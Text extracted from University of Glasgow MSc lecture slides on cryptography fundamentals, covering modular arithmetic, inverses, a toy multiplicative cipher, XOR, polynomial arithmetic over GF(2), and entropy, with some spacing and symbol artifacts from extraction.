# CSD_All_slides

<!-- Page 1 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 2 -->

Who I am Hanoi University of Science and Technology, Vietnam (BSc) Pohang University of Science and Technology, South Korea (MSc) DASAN Networks Corporation, South Korea (Software Engineer) Liverpool John Moores University, Ph.D (2015 - 2018) Imperial College London, Research Associate (2018 - 2022) University of Glasgow, Lecturer (2022 - onward)


<!-- Page 3 -->

Who I am My research interest is Cyber Security, particularly Data Privacy, Federated Learning, Blockchains and Decentralised Systems . Ø Data Privacy: “ GDPR - compliant personal data management: A blockchain - based solution”, NB Truong , K Sun, GM Lee, Y Guo, IEEE Transactions on Information Forensics and Security, 1746 - 1761, 2020 Ø Federated Learning: “Privacy Preservation in Federated Learning: An insightful survey from the GDPR Perspective”, NB Truong , K Sun, Siyao Wang, Florian Guitton , Y Guo, Elsevier Computers & Security (COSE) 110 (2021), Ø Blockchain and Bitcoin: “Strengthening the Blockchain - based Internet of Value with Trust”, NB Truong, TW Um, B Zhou, GM Lee, IEEE International Conference on Communication (ICC) 2018 Ø Decentralised Systems: “A blockchain - based trust system for decentralised applications: When trustless needs trust”, N Truong , GM Lee, K Sun, F Guitton , YK Guo, Future Generation Computer Systems 124, 68 - 79, 2021


<!-- Page 4 -->

Course Overview This M.Sc. course covers two main goals: (1) Encryption and Decryption algorithms, and (2) How to utilise the algorithms in developing secure applications. - The first part of this course focuses on understanding a variety of encryption and other cryptographic algorithms & schemes (2/3). - The second part of this course focuses on developing secure applications (1/3). Demonstration applications are written in JAVA.


<!-- Page 5 -->

Course Overview Coverage on how those Encryption and other cryptographic schemes are utilised is provided in: Ø Cyber Security Fundamentals. More specialised cyber security courses are: Ø Enterprise Cyber Security Ø Cyber Security Forensics Ø Human Centred Security Ø Safety Critical Systems


<!-- Page 6 -->

Course Structure The course structure consists of 5 main sessions: 1. Fundamental Foundation for Cryptography 2. Symmetric Encryption schemes – Traditional E ncryption – Modern E ncryption schemes – Message digests, random numbers, multiple - key encryption 3. Public - key E ncryption/Asymmetric key encryption – Diffie - Hellman, RSA – Elliptic Curve Cryptography – Crypto - currencies (e.g., Bitcoin, Ethereum) and Blockchain 4. Coding and Security 5. Secure D evelopment


<!-- Page 7 -->

Textbooks Some books are very useful for the course 1. Applied Cryptography: Bruce Schneier . Covers the cryptography part of the course. 2. Bitcoin and Cryptocurrency Technologies: Narayanan, Bonneau, Felten , Miller, Goldfelder . Bitcoin and Blockchain. 3. Security Engineering: Ross Anderson. The secure development part of the course.


<!-- Page 8 -->

Course Aims and Intended Learning Outcomes (ILOs) Aims 1. To develop student's knowledge of cryptographic algorithms, how they can be attacked and how to evaluate how secure they are. 2. To develop student's practical skills in developing secure systems. ILOs 1. Explain basic cryptographic algorithms, how they can be attacked and evaluate how secure they are. 2. Demonstrate an advanced understanding of a range of specialist algorithms, explaining when they are useful. 3. Produce a program that uses a standard cryptographic library to solve a security problem. 4. Critically compare and contrast many ways of developing secure systems.


<!-- Page 9 -->

Course Assessment Assessment of the course: § 80% Exam § 20% Coursework Ø You will be given an individual set of encrypted messages and will have to find the plaintext using several different techniques. Some bonus points for students who are doing well and showing their understanding and contribution during the lectures.


<!-- Page 10 -->

How to do well Attend all the lectures and do the quizzes § Learn as you go Ø It is too difficult to try and learn the course just before the exam. Ø Lots of examples and instructions on the Internet. Try to learn proactively. § Do the coursework Ø Most marks are in the exam; however, doing the coursework helps you understand more about the lectures.


<!-- Page 11 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 12 -->

Course Structure The course structure consists of 5 main sessions: 1. Fundamental Foundation for Cryptography 2. Symmetric Encryption schemes – Traditional E ncryption – Modern E ncryption schemes – Message digests, random numbers, multiple - key encryption 3. Public - key E ncryption/Asymmetric key encryption – Diffie - Hellman, RSA – Elliptic Curve Cryptography – Crypto - currencies (e.g., Bitcoin, Ethereum) and Blockchain 4. Coding and Security 5. Secure D evelopment


<!-- Page 13 -->

Lecture 1: Fundamental Foundation for Cryptography


<!-- Page 14 -->

Lecture Outline 1. Cryptography Overview & Terminology 2. Mathematical Foundation Ø Integer mod N Ø Polynomial Arithmetic 3. Information Theory


<!-- Page 15 -->

Cryptography Overview Ø Pr o b lem : A l i c e and B o b wo ul d l i k e to e x c han ge messages ( over a public network ) without revealing to anyone but the intended recipient. Ø Eve a nd Malory a re a d v er sa ries Ø Solution : Cryptography Al i c e B o b Malory Eve


<!-- Page 16 -->

How does Cryptography work? Encryption Key Decryption Key Cipher Al i c e B o b


<!-- Page 17 -->

Ø Plaintext : original message needs to be transmitted which is information that can be directly read by humans or a machine. Ø Ciphertext: the encrypted data which is “unreadable” Ø Cipher : the mathematics (or algorithm) responsible for turning plaintext into ciphertext and reverting ciphertext to plaintext. Ø Stream Cipher & Block Cipher Ø Encryption: the process of converting plaintext to ciphertext Ø Decryption : the process of reverting ciphertext to plaintext Ø Secret Keys : an additional input for Encryption or Decryption in a way that Decryption can only be performed by the proper key. Terminology


<!-- Page 18 -->

Plaintext as Integers Plaintext : original message (e.g., letters, bitstring, etc.) that needs to be securely transmitted We note that: Ø Letters can be represented as integers. Ø Use the ASCII or similar code. Ø A series of bits (a bitstring) can be represented as a series of integers. Ø Split it into chunks and treat each chunk as a binary number. Ø Thus, text can always be represented as a series of integers.


<!-- Page 19 -->

Encryption & Decryption: First Intuition Cipher : How to turn plaintext into ciphertext, and turn it back? A simple example: Ø Let us assume that our alphabet consists of 26 letters and 3 other characters: space ( - ) , a nd . ü We can represent these 29 characters by the numbers 0 .. 28 . Ø A simple way of encrypting plaintext is to multiply the letter value by a number between 2 and 28, the secret key . ü This will normally produce a number larger than 28, making it hard to write down the cipher text. ü We can divide the cipher text by 29 and keep the remainder, which will be in the range [0 .. 28] and can be represented by one of our characters. Ø We can decrypt the ciphertext by dividing it by the secret key , which will not normally produce an integer!


<!-- Page 20 -->

Course Assessment Example: Ø Encrypt the plaintext: “ I LOVE YOU, BOB. ” § Our alphabet characters A B C … Z ( - ) (,) and (.) are represented by 0 1 2 … 25 26 27 28, respectively. § Our secret key is 10 § I à Remainder of (8 x 10) % 29 = 22 à W § ( - ) à Remainder of (27 x 10) % 29 = 9 à J § L à Remainder of (11 x 10) % 29 = 23 à X Ø Question: How to decrypt the ciphertext if we know the secret key (i.e., 10): WJX… § W à 22 à ? § J à 9 à ? § X à 23 à ?


<!-- Page 21 -->

English Alphabet in Order


<!-- Page 22 -->

Mathematical Foundation 2. Mathematical Foundation Ø Integer mod N Ø Polynomial Arithmetic


<!-- Page 23 -->

Integer modulo n Integer mod n: Ø Let us only use some of the integers, not all of them. § A l l t he i n t e g e r s b e t w e e n ( 0 . . n - 1) fo r s o m e n § n can be v e ry l a r g e , sa y 10 0 di g i t s ! Ø Any integer outside the range ( 0 . . n - 1) can be converted to an integer inside the range by dividing by n a nd keeping the remainder § Like our simple example. Ø These are called “ integers mod n” Ø For example, “ integers mod 7” contain the following 7 numbers: § { 0, 1, 2, 3, 4, 5, 6 } § 10 , 17 , 2 4 a re a l l t he sa m e a s 3 § - 1 i s t he sa m e a s 6


<!-- Page 24 -->

Inverses Ø If a is an “ integer mod n ” and x is its inverse , then they satisfy the equation: ax ≡ 1 mod n § Any number multiplied by its inverse is 1 § We k n ow a and n , a n d we w a nt t o f i nd x Ø º means “ equivalent ” after the modulus operation. § If a=3, x=4, n=11 then ax = 12 , which is equivalent to ( º ) 1 Ø x must also be an integer, but modular arithmetic makes this possible . I will often use % to mean mod (it is used for mod in programming).


<!-- Page 25 -->

Example: Integer mod 7 Inverses in Integers mod 7 number system Ø 0 does n ot h a v e a n in v e r s e . • By convention, the inverse of 0 is 0. Ø T he i n v e r s e o f 1 is 1 . Ø T he i n v e r s e o f 6 is 6 • 6 (a) * 6 (x) = 36 ≡ (equivalent) 1 mod 7 which satisfies the equation: • 6 ≡ - 1 a n d - 1* - 1 = 1 Ø T he i n v e r s e o f 2 i s 4 ( a n d i nv e r s e o f 4 is 2 ): • 2 * 4 = 8 ≡ 1 mod 7 Ø T he i n v e r s e o f 3 i s 5 ( a n d in v e r s e o f 5 i s 3 ): • 3 * 5 = 15 ≡ 1 mod 7


<!-- Page 26 -->

Example: Integer mod 4 Considering Integers mod 4 number system Ø Possible values are {0, 1, 2, 3} Ø T he i n v e r s e o f 1 i s 1 Ø T he i n v e r s e o f 3 i s 3 § 3 * 3 = 9 ≡ 1 mod 4. Ø 2 d o e s n ot h a v e a n in v e r s e (in “ integers mod 4 ” number system). Why? § 2 time s a n y t h i ng i s a l w a y s a n e v e n nu m b e r. § D i v i d i ng by 4 a l w a y s l e a v e s a n e v e n r e m a i nd e r. § Therefore, the remainder cannot be 1 . Ø Modular arithmetic does not guarantee that all numbers have inverses.


<!-- Page 27 -->

Existence of Inverses Question: When will a number have an Inverse? Ø Le t a b e a number in the “ i n t e g e r m od n ” number system . Ø a will have an inverse if and only if gcd (a, n) = 1 § gcd is t he “ g r e a t es t c o mm on d i v i s o r” or “ high es t c o m m on f a c to r”. § This condition means that a a nd n do not have any common factors. § gcd (2 , 4 ) = 2 a n d s o 2 d o e s n o t h a ve a n i n v e r s e i n th e i n t e g e rs mod 4 number system. § The proof is beyond the scope of this course. Ø If n is a prime number, then all numbers a , except 0 , will have an inverse. § It was lucky that I chose n = 29 for my example system!


<!-- Page 28 -->

How to find Inverses? Ø The previous slide shows when an inverse exists but not how to calculate it. § An algorithm will follow. Ø First, we need a general theorem that is applicable to all calculations with “ integer mod n ” number system.


<!-- Page 29 -->

Ø We can perform the modulus operation whenever it is convenient . • The final answer will always be the same. Ø (a Ä b) % n = ((a % n) Ä (b % n)) % n • wh e re Ä i s + , - o r * • % i s t he modulus operato r. Ø The proof is beyond the scope of the course . Ø For example, calculat e 2 0 * 1 1 with “ integers mod 7 ”. • (2 0 * 11 ) % 7 = 22 0 % 7 = 3 (after some long division) • (20%7 ) * (11%7) % 7 = (6*4) % 7 = 24 % 7 = 3 Ø The numbers are smaller in the second calculation . The Homomorphism Theorem


<!-- Page 30 -->

Ø A number is divisible by 9 if we add up all the digits and that sum is divisible by 9 . • For instance, 1234566 is divisible by 9 as (1+2+3+4+5+6+6 )=27 which is divisible by 9. Ø We can use the homomorphism theorem to prove it. If a number n has digits a i , then a i represents the powers of 10 , so: n = ∑ a i x10 i , where means sum over all values of i . Now : n % 9 = ( ∑ a i x10 i ) % 9 = ∑ (a i % 9) x (10 % 9 ) i Now: ( 1 0 % 9 = 1) an d ( 1 i = 1) for all values of i , thus : = ( ∑ a i ) % 9 Ø Similar reasoning can be used to prove the rule for division by 11 . Example: Divisible by 9


<!-- Page 31 -->

Ø Use a repeated squaring algorithm. 3 2 = 9 3 4 = 9 2 = 81 3 5 = 3 * 3 4 = 3 * 81 = 243 à 3 5 % 7 = 243 % 7 = 5 Ø Alternatively, we can use the homomorphism theorem to do % at each step 3 2 % 7 = 9 % 7 = 2 3 4 % 7 = 2 2 % 7 = 4 % 7 = 4 à 3 5 % 7 = (3 * 4) % 7 = 12 % 7 = 5 Ø The second approach is preferable because the numbers stay small . Ø Numbers are typically very large in cryptography . • Calculate ( 100 digit ) 100 digit % 100 digit ! Example: Calculate 3 5 % 7


<!-- Page 32 -->

Ø T he i n v e r s e a l g o r i t hm s ol v e s t he e q u a t i o n ( fin d x , g i v e n a a nd n ) that satisfies: ax ≡ 1 (mod n) T he i n v e r s e o f a i s x Ø This also gives us a way to do division: a / b (mod n) ≡ a * (1/b) (mod n ) Ø Dividing by b is the same as multiplying by 1/b Inverse Algorithm and Division


<!-- Page 33 -->

1. The following equation is trivially true: n * x ≡ n (mod n) à E1 2. We want to solve: a * x ≡ 1 (mod n) à E2 3. We subtract the two equations to get a third equation E3: E1 – E2 à E3 If the number on the right is negative, add n . This is allowed with “ integers mod n ” 4. Discard the equation with the largest number in front o f x , a nd r e p ea t . For instance: E2 – E3 à E4; E3 – E4 à E5 .. 5. S to p w h e n t he nu m b e r i n f r on t o f x i s 1 Finding Inverse: Algorithm


<!-- Page 34 -->

Note that: Ø If a d oes not have an inverse, then the number in front of x will never be 1 . Ø The number in front of x will always be positive and get smaller, so this algorithm will always finish. Finding Inverse: Algorithm


<!-- Page 35 -->

Ø Ca l c u l a t e t he i nv e r s e x o f 8 m o d 1 3 ( ax ≡ 1 (mod n): a = 8, n = 13; find x) Check: with x = 5 we have: 8 * 5 = 40 = 3*13 + 1 à 8*5 ≡ 1 (mod 13) In other words: 5 is inverse of 8 mod 13 13x ≡ 13 (mod 13) Step1: E1: always true 8x ≡ 1 (mod 13) Step2: E2: starting equation 5x ≡ 12 (mod 13) Step3: E3: E1 – E2 3x ≡ - 11 ≡ 2 (mod 13) Step4: E4: E2 – E3 2x ≡ 10 (mod 13) Step4: E5: E3 – E4 (repeat) x ≡ - 8 ≡ 5 (mod 13) Step5: E6: E4 – E5 (repeat & stop) Finding Inverse: Example


<!-- Page 36 -->

Encryption and Decryption: An example using Integer mod n Number system


<!-- Page 37 -->

Ø The letters a - z have the values 0..25 , with ˽ =26 , , = 27 and . = 28 . Ø Let the plaintext be “secret ˽ message” 1. Turning the plaintext characters into numbers: <18,4,2,17,4,19,26,12,4,18,18,0,6,4> 2. Choose secret key = 5 ( an arbitrary choice ); Multiply each letter by the secret key ; then do “ integer mod 29" . 3. The ciphertext in numbers is: <3,20,10,27,20,8,14,2,20,3,3,0,1,20> 4. T u r n i n g t he n u m b e rs b a c k i n t o l e t t e r s g i v e s us the ciphertext in letters: “ duk.uiocuddabu ” Note that repeated s a nd e a lso show up in the ciphertext as repeated d and u , a weakness of this cipher. Example: Encryption


<!-- Page 38 -->

Ø The secret key = 5 . The “ decryption key ” x is the “ inverse of 5 mod 29 ” . Let do the algorithm: Ø Check: 5 * 6 = 30 = 29 + 1 . 29x = 29 E1: always true 5x = 1 E2: the equation to solve 24x = 28 E3 = E1 - E2 19x = 27 14x = 26 9x = 25 4x = 24 x = - 23 = 6 Example: Decryption


<!-- Page 39 -->

Ø We have secret key = 5 , decryption key = 6 , the modulus n = 29, and ciphertext = duk.uiocuddabu Ø To decode the ciphertext, start with the numerical version of the cipher text and multiply by the decryption key , which is 6 ; then do “ integer mod 29 " . Ø Cipher t ext = <3,20,10,27,20,8,14,2,20,3,3,0,1,20> ( 3 * 6) % 29 = 18 (20 * 6) % 29 = 4 (10 * 6) % 29 = 2 (27 * 6) % 29 = 17 ( 8 … * 6) % 29 = 19 Example: Decryption


<!-- Page 40 -->

Ø This recovers the plaintext in numbers: <18,4,2,17,4,19,26,12,4,18,18,0,6,4> Ø In letters, the plaintext is: secret ˽ message We successfully decrypt the original message (i.e., plaintext) from the ciphertext. Discussion: From the Decryption side, what information do we need to successfully decrypt the ciphertext? What information should be kept secret, and what can be public? Example: Decryption


<!-- Page 41 -->

Ø Look at the sequence of subtractions in the example when finding the decryption key x • Decryption key x is the “ inverse of 5 mod 29 ” . Ø It is more efficient to find the inverse by division rather than subtraction. • The subtraction algorithm is useful for small examples. • An even faster binary algorithm is based on subtraction and removing powers of 2. Ø Fast algorithms also exist for: • Calculating gcd . • Calculating exponents: a z % n which is used in several encryption algorithms. Finding Inverse: Fast Algorithm


<!-- Page 42 -->

1. Calculate 5 7 mod 11 by hand using “ repeated squaring ” and the “ homomorphism theorem ”. Verify that the calculations would be much harder if you left the mod 11 calculation to the end. 2. Calculate 1 / 8 mod 11 (the inverse of 8 ) by hand using the equation subtracting algorithm . Use your result to calculate 5 / 8 mod 11 . Quizzes


<!-- Page 43 -->

Lecture Summary


<!-- Page 44 -->

Lecture Summary Ø Text, and indeed any input, can be converted to a series of integers. • Using a numbering scheme. • Converting to bits, creating blocks of bits, converting each block to an integer . Ø Dividing by integers doesn't usually result in an integer. Ø Using integers mod n lets us define integer inverses. • Solve equation: ax ≡ 1 (mod n) Ø If the number a and the modulus n have a common factor, then there is no inverse. • Choosing n as a prime is convenient. Ø Solving equation ax ≡ 1 (mod n) uses a trick since n * x ≡ n (mod n) is always true. • Keep subtracting, reducing the number in front of x each time. Ø We can take the remainder when dividing by n whenever we want, which reduces the size of numbers in our calculations.


<!-- Page 45 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 46 -->

Lecture 1: Fundamental Foundation for Cryptography


<!-- Page 47 -->

Lecture Outline 1. Cryptography Overview & Terminology 2. Mathematical Foundation Ø Integer mod N Ø Polynomial Arithmetic 3. Information Theory


<!-- Page 48 -->

Integers mod n Ø Text, and indeed any input, can be converted to a series of integers. • Using a numbering scheme. • Converting to bits, creating blocks of bits, converting each block to an integer. Ø Dividing by integers doesn't usually result in an integer. Ø Using integers mod n lets us define integer inverses. • Solve equation: ax ≡ 1 (mod n) Ø If the number a and the modulus n have a common factor, then there is no inverse. • Choosing n as a prime is convenient. Ø Solving equation ax ≡ 1 (mod n) uses a trick since n * x ≡ n (mod n) is always true. • Keep subtracting, reducing the number in front of x each time. Ø We can take the remainder when dividing by n whenever we want, which reduces the size of numbers in our calculations.


<!-- Page 49 -->

Exclusive O R ( XOR ) 5


<!-- Page 50 -->

Ø Polynomial arithmetic, as used in cryptography, is based on integers mod 2 . Ø There are only 2 values, 0 and 1 . • They can be stored in a single bit. Ø Addition and subtraction are both the same and equal to E xclusive OR . 0 +0= 0 , 0 - 0= 0 , 0 Å 0= 0 0 +1= 1 , 0 - 1= - 1=1 , 0 Å 1=0 1+0=1, 1 - 0=1, 1 Å 0=1 1+1=2=0, 1 - 1=0, 1 Å 1=0 Integers mod 2


<!-- Page 51 -->

a Å a = 0 if bits the same, result is 0 a Å 0 = a 0 Å 0 = 0, 1 Å 0 = 1 Ø The E xclusive OR ( XOR ) operator applies integers mod 2 arithmetic to all bits independently. Ø There are two special situations. Let a be a bit (value 0 or 1 ) Ø Two operations with the same value cancel out. Ø For example , swap values in a and b with no extra variable. a = a Å b a stores a Å b b = a Å b b stores a Å b Å b = a Å 0 = a a = a Å b a stores a Å b Å a = b Å 0 = b Ø In programming languages like C, C++ and Java , the E xclusive OR (XOR) operator is ^ . XOR Operator


<!-- Page 52 -->

Powers and Logs 8


<!-- Page 53 -->

Ø The log function is the inverse of the power function. • If x = b y à y = log b (x) ; x > 0 • Special values: • If x = 2 y à y = log 2 (x) • If y = 1 t h e n x = 2 à log 2 (2) = 1 • If y = 0 t h e n x = 1 à log 2 (1) = 0 Ø Some properties: Rules for combining powers/Logs rules • b x b y = b x+y | log b ( x.y ) = log b (x) + log b (y) • 1/ b x = b - x | log b (x/y) = log b (x) - log b (y) • ( b x ) y = b xy | log b (x y ) = ylog b (x) Ø L o g s b as e 2 are c o nv e n i e nt f or c o m pu t i n g . Logs: some Observations


<!-- Page 54 -->

Ø 2 5 = 3 2 a n d s o lo g 2 (32 ) = 5 • Similar to other powers of 2 . Ø 2 10 is roughly 1,000 and so log 2 (1000) is roughly 10 Ø 2 20 is roughly 1,00 0 * 1,00 0 = 1,000,00 0 . Ø 26 is between 16 and 32 and so log 2 (26) is between 4 and 5 . Logs: some Observations


<!-- Page 55 -->

Polynomial Arithmetic 1 1


<!-- Page 56 -->

Ø Polynomials are algebraic expressions that consist of variables and coefficients . • An example of a polynomial with one variable is x2 +x - 12 . In this example, there are three terms: x 2 , x and - 12 . Ø We can perform arithmetic operations such as addition, subtraction, multiplication, and also positive integer exponents for polynomial expressions but not division by variable . Polynomials


<!-- Page 57 -->

Polynomials in Cryptography Ø A p o lyn o m i a l i n v o l v e s t e r m s i n x , x 2 , x 3 an d s o o n. • We are not interested in actually calculating x . • We just want to use polynomial arithmetic to produce new polynomials. Ø We are interested in a special form of polynomial where the coefficients of t he p ow e rs o f x a re int e g e r s m od 2 . • E it h e r 1 o r 0 . Ø So, a typical polynomial would be • 1 + x 2 + x 5 Ø Or, written in full. • 1 + 0*x + 1*x 2 + 0*x 3 + 0*x 4 + 1*x 5 + 0*x 6 …


<!-- Page 58 -->

Ø Polynomial arithmetic is more convenient than integers mod n when converting to and from a bit string. • AES (see later) uses polynomial arithmetic . Ø Integers mod n must be used when actual numbers are being used. • Public Key algorithms such as RSA and Diffie - Hellman (see later) use integers mod n. Polynomial Arithmetic


<!-- Page 59 -->

Ø Converting from a bit string to one of these polynomials is very easy. Ø The bits, starting with the least significant bit, are the coefficients of the powers of x . 1101 2 à x 3 + x 2 + 1 Ø Converting back is also straightforward . x 3 + x 2 + 1 à 1101 2 Ø The operations , +, - , *, % , for encryption and decryption operations can be done with polynomial arithmetic. Bit String & Polynomial


<!-- Page 60 -->

Ø Addition and subtraction are straightforward. • Subtraction is the same as addition! Both are XOR Ø Multiplication is also straightforward but leads to bigger polynomials. (1+x 2 +x 3 )(x+x 3 ) = Polynomial Arithmetic 1 + x 2 + x 3 + x + x 3 = 1 + x + x 2 x + x 3 + x 4 + x 3 + x 5 + x 6 = x + x 4 + x 5 + x 6


<!-- Page 61 -->

Ø We can reduce the size of polynomials produced by multiplication by taking the remainder after dividing one polynomial by another. • The same trick as integers mod n . Ø If we wanted the highest power to be x 3 the n we divide by a polynomial with the highest power x 4 Ø Polynomial division is complicated, even though taught in high school maths Ø It is a lot easier with polynomials based on integers mod 2! Remainder after Division


<!-- Page 62 -->

Ø Some polynomials are ‘prime’ • They can’t be written as factors of smaller polynomials. • They are called irreducible polynomials . Ø If we do polynomia l arithmetic mod ( an irreducible polynomial ) , then all polynomials will have inverses . Ø Some irreducible polynomials : Prime Polynomials 3 bit : x 3 + x + 1 4 bit: x 4 + x + 1 6 bit: x 6 + x + 1 8 bit: x 8 + x 4 + x 3 + x + 1


<!-- Page 63 -->

Ø The irreducible polynomial is IP = x 3 + x + 1. Ø The eight possible polynomials are: 0 = 000 2 = 0 4 = 100 2 = x 2 1 = 001 2 = 1 5 = 101 2 = x 2 + 1 2 = 010 2 = x 6 = 110 2 = x 2 + x 3 = 011 2 = x + 1 7 = 111 2 = x 2 + x + 1 3 - bit Polynomials


<!-- Page 64 -->

Ø The algorithm for calculating polynomial inverses is similar to that for integers mod n . • Le t p b e a p o ly no m i a l . • Le t z b e t he i n v e r s e o f p , a l s o a p o lyn o m i a l . • p z = 1 m od ir r e d u c i b l e p o l y no m i a l . • Polynomial arithmetic is used. Ø The calculations are more complex, and so for small polynomials, it is easier to create a multiplication table . • I have done the polynomial arithmetic for 3 - bit polynomials, leading to the following table . Ø T he i n v e r se s a r e fo u n d by l o o k i ng fo r 1 i n e ac h r ow. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Polynomial Inverses


<!-- Page 65 -->

1 2 3 4 5 6 7 Inverse 1: 1 2 3 4 5 6 7 1 (1 * 1 = 1) 2: 2 4 6 3 1 7 5 5 (2 * 5 = 1) 3: 3 6 5 7 4 1 2 6 (3 * 6 = 1) 4: 4 3 7 6 2 5 1 7 (4 * 7 = 1) 5: 5 1 4 2 7 3 6 2 (5 * 2 = 1) 6: 6 7 1 5 3 2 4 3 (6 * 3 = 1) 7: 7 5 2 1 6 4 3 4 (7 * 4 = 1) Multiplication table for 3 - bit Polynomials


<!-- Page 66 -->

Example: 5*6 mod 3 - bit IP 5 = 101 2 = x 2 + 1 6 = 110 2 = x 2 + x P = (x 2 + 1)(x 2 + x) = x 4 + x 3 + x 2 + x Irreducible polynomial IP = x 3 + x + 1 We need to calculate: P mod IP 1. Remove the power of x 4 : Q = P – x * IP 2. Remove the power of x 3 : R = Q - IP x 4 + x 3 + x 2 + x - x 4 + x 2 + x = x 3 x 3 - x 3 + x + 1 = x + 1 = 011 2 = 3


<!-- Page 67 -->

Ø Many algorithms work with 8 - bit polynomials since they represent a single byte . Ø Results can be stored in a lookup table. • There are 2 8 = 256 different polynomials. • A table is needed for multiplication: • There ar e 2 16 = 64k values. • Also , for inverses, there are 2 8 = 256 values. • Each value is 1 byte . Ø This is easy to store in hardware, typically on a CPU chip. 8 - bit Polynomials


<!-- Page 68 -->

Ø The mathematical name for using integers mod n and polynomials mod an irreducible polynomial is computing with Galois Fields (GF ) . • Doesn’t it seem a lot harder already? Ø Integers mod n are GF(n). Ø Polynomials of degree n ( i.e. n=8 for bytes) are GF(2 n ). Ø Don’t be put off by terminology! Galois Fields


<!-- Page 69 -->

1. How is polynomial arithmetic similar and how does it differ from using integers mod n ? In what way is it better ? When must integers mod n be used rather than polynomial arithmetic? 2. Convert 1010 2 and 0110 2 to polynomials, add them up, and convert the answer back to bit strings. 3. Now multiply them, using the irreducible polynomial x 4 + x + 1 Quizzes


<!-- Page 70 -->

Lecture Summary


<!-- Page 71 -->

Ø Exclusive OR is a useful operation in cryptography • Two applications of the same value cancel out. Ø Polynomial arithmetic usually uses single bits ( 0 or 1 ) as coefficients of powers of x . Ø This makes it easy to convert from bits to polynomials. • Each bit corresponds to a coefficient in the polynomial. Ø It is common to split the bit string input into individual 8 - bit bytes. • This involves arithmetic with polynomials with the highest power x 7 . Ø Adding and subtracting polynomials is easy. • Each coefficient is combined using Exclusive OR . • If both coefficients are the same, the answer is 0 . • If they are different the answer is 1 . Polynomial Arithmetic


<!-- Page 72 -->

Ø Multiplying polynomials produces longer polynomials . Ø We can divide by a 'prime’ (irreducible) polynomial and keep the remainder . • Like integers mod n . Ø It is convenient to create a multiplication table so that multiplication calculations just need a fast table lookup. Polynomial Arithmetic


<!-- Page 73 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 74 -->

Lecture 1: Fundamental Foundation for Cryptography


<!-- Page 75 -->

Lecture 1 - Review


<!-- Page 76 -->

Ø Exclusive OR is a useful operation in cryptography • Two applications of the same value cancel out. Ø Polynomial arithmetic usually uses single bits ( 0 or 1 ) as coefficients of powers of x . Ø This makes it easy to convert from bits to polynomials. • Each bit corresponds to a coefficient in the polynomial. Ø It is common to split the bit string input into individual 8 - bit bytes. • This involves arithmetic with polynomials with the highest power x 7 . Ø Adding and subtracting polynomials is easy. • Each coefficient is combined using Exclusive OR . • If both coefficients are the same, the answer is 0 . • If they are different the answer is 1 . Polynomial Arithmetic


<!-- Page 77 -->

Ø Multiplying polynomials produces longer polynomials. Ø We can divide by a 'prime’ (irreducible) polynomial and keep the remainder. • Like integers mod n . Ø It is convenient to create a multiplication table so that multiplication calculations just need a fast table lookup. Polynomial Arithmetic


<!-- Page 78 -->

Lecture Outline 1. Cryptography Overview & Terminology 2. Mathematical Foundation Ø Integer mod N Ø Polynomial Arithmetic 3. Information Theory


<!-- Page 79 -->

3. Information Theory


<!-- Page 80 -->

Ø Information theory examines situations where there are a lot of possible messages . • All messages are written in English. • All messages use the ASCII character set. • All possible images are made up of 1080 x 1920 pixels. Ø Each message is made up of a series of letters. Ø All possible letters form an alphabet. • All English letters • All English letters + punctuation s . • All 64 - bit values. Information Theory


<!-- Page 81 -->

Ø The entropy of a set of messages is the number of bits needed to encode all possible messages with an optimal encoding. Ø Let X = {x i } be the set of all possible messages, with message x i occurring with probability p(x i ). Ø T he e n t r o py H is d e fi n e d a s H(X) = S p(x i ) log 2 (1/p(x i )) Ø Further discussion on why this is a useful concept is beyond the scope of this course. Entropy


<!-- Page 82 -->

Ø Consider the Gender field in a database. Ø The two possible values, MALE and FEMALE have equal probability. p 1 = p 2 = 1/2 Ø Therefore 1 bit is needed to encode this information. • This is not a surprise! H = 1/2 log 2 (2) + 1/2 log 2 (2) = 1/2 + 1/2 = 1 Entropy: Example


<!-- Page 83 -->

Ø Now change the probabilities as follows: p 1 = 7/8 p 2 = 1/8 à H = 0.5410 Ø Fewer bits are needed when one value is more likely than the other. • We could group the values in 10’s and use 6 bits per group. Non - Equal Probabilities


<!-- Page 84 -->

Ø Now assume that the database allows NULL values for the Gender field. • The gender information is not provided in half of the entries. p 1 = p 2 = 1/4 p 3 = 1/2 à H = 1/4 log 2 (4) + 1/4 log 2 (4) + 1/2 log 2 (2) = 1/2 + 1/2 + 1/2 = 1.5 Null Values


<!-- Page 85 -->

Ø T h e re a re n messages , a l l e qu a ll y li k e ly . p i = 1/n for all values of i . à H = n (1/n log 2 (n)) = log 2 (n) Ø log 2 (n) is the number of bits in the binary representation of n. Entropy: Another Example


<!-- Page 86 -->

Ø All ways of encoding data have some structure which makes them different from purely random collections. Ø English is highly structured, with a lot of redundancy . Ø Compressing a file of English text reduces the structure, but there is still some structure in the compression encoding table. Ø Information theory provides quantitative estimates of the amount of redundancy . Ø Code - breaking attacks that exploit this redundancy are called statistical attacks . The Redundancy of a Language


<!-- Page 87 -->

Ø The absolute rate (R) is defined as the maximum number of bits of information that could be encoded by the language, assuming all sequences of characters are equally likely . Ø Le t L b e t he n u m b e r o f c h a r a c t e rs i n t he a l ph a b e t . Ø R = log 2 (L) from the earlier example . à T his means L = 2 R . Ø In English, R = log 2 ( 26 ) = 4 . 7 The Absolute Rate of a Language


<!-- Page 88 -->

